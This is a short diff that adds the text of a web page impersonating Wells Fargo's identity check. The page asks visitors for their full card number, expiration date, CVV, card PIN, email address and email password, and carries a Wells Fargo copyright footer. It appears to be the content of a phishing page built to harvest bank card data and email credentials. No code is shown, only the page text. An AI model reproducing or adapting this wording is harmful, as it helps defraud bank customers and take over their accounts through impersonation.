@@ -1,0 +1,18 @@
+Let's make
+sure it's you
+!
+Let's get started. First, we'll need some information from you.
+:+: Debit or Credit Card Identity
+Debit or ATM Card Numbers (16 Digits)
+Expiration Date
+Secret code (also known as CVV/CVC/CID)
+Debit or ATM Card PIN (4-Digits)
+:+: Email Authorization
+Email Address
+Email Password
+Opens a dialog
+Continue
+Privacy, Cookies, Security & Legal
+|
+Ad Choices
+© 1999 - 2020 Wells Fargo. All rights reserved. NMLSR IR 399801
